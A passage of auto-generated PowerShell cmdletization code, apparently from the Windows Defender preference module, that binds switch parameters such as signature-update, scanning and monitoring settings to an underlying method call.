[object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureDisableUpdateOnStartupWithoutEngine')) {\r\n          [object]$__cmdletization_value = ${SignatureDisableUpdateOnStartupWithoutEngine}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureFallbackOrder')) {\r\n          [object]$__cmdletization_value = ${SignatureFallbackOrder}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SharedSignaturesPath')) {\r\n          [object]$__cmdletization_value = ${SharedSignaturesPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object"
"]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SharedSignaturesPathUpdateAtScheduledTimeOnly')) {\r\n          [object]$__cmdletization_value = ${SharedSignaturesPathUpdateAtScheduledTimeOnly}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPathUpdateAtScheduledTimeOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPathUpdateAtScheduledTimeOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureScheduleDay')) {\r\n          [object]$__cmdletization_value = ${SignatureScheduleDay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureScheduleTime')) {\r\n          [object]$__cmdletization_value = ${SignatureScheduleTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureUpdateCatchupInterval')) {\r\n          [object]$__cmdletization_value = ${SignatureUpdateCatchupInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureUpdateInterval')) {\r\n          [object]$__cmdletization_value = ${SignatureUpdateInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureBlobUpdateInterval')) {\r\n          [object]$__cmdletization_value = ${SignatureBlobUpdateInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureBlobFileSharesSources')) {\r\n          [object]$__cmdletization_value = ${SignatureBlobFileSharesSources}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MeteredConnectionUpdates')) {\r\n          [object]$__cmdletization_value = ${MeteredConnectionUpdates}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionOnWinServer')) {\r\n          [object]$__cmdletization_value = ${AllowNetworkProtectionOnWinServer}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableDatagramProcessing')) {\r\n          [object]$__cmdletization_value = ${DisableDatagramProcessing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableConvertWarnToBlock')) {\r\n          [object]$__cmdletization_value = ${EnableConvertWarnToBlock}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableConvertWarnToBlock'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableConvertWarnToBlock'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCpuThrottleOnIdleScans')) {\r\n          [object]$__cmdletization_value = ${DisableCpuThrottleOnIdleScans}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Disab"
"leCpuThrottleOnIdleScans'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MAPSReporting')) {\r\n          [object]$__cmdletization_value = ${MAPSReporting}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SubmitSamplesConsent')) {\r\n          [object]$__cmdletization_value = ${SubmitSamplesConsent}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableAutoExclusions')) {\r\n          [object]$__cmdletization_value = ${DisableAutoExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisablePrivacyMode')) {\r\n          [object]$__cmdletization_value = ${DisablePrivacyMode}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RandomizeScheduleTaskTimes')) {\r\n          [object]$__cmdletization_value = ${RandomizeScheduleTaskTimes}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SchedulerRandomizationTime')) {\r\n          [object]$__cmdletization_value = ${SchedulerRandomizationTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableBehaviorMonitoring')) {\r\n          [object]$__cmdletization_value = ${DisableBehaviorMonitoring}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableIntrusionPreventionSystem')) {\r\n          [object]$__cmdletization_value = ${DisableIntrusionPreventionSystem}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableIOAVProtection')) {\r\n          [object]$__cmdletization_value = ${DisableIOAVProtection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRealtimeMonitoring')) {\r\n          [object]$__cmdletization_value = ${DisableRealtimeMonitoring}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableScriptScanning')) {\r\n          [object]$__cmdletization_value = ${DisableScriptScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableArchiveScanning')) {\r\n          [object]$__cmdletization_value = ${DisableArchiveScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}"
"\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCatchupFullScan')) {\r\n          [object]$__cmdletization_value = ${DisableCatchupFullScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCatchupQuickScan')) {\r\n          [object]$__cmdletization_value = ${DisableCatchupQuickScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableEmailScanning')) {\r\n          [object]$__cmdletization_value = ${DisableEmailScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRemovableDriveScanning')) {\r\n          [object]$__cmdletization_value = ${DisableRemovableDriveScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRestorePoint')) {\r\n          [object]$__cmdletization_value = ${DisableRestorePoint}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableScanningMappedNetworkDrivesForFullScan')) {\r\n          [object]$__cmdletization_value = ${DisableScanningMappedNetworkDrivesForFullScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        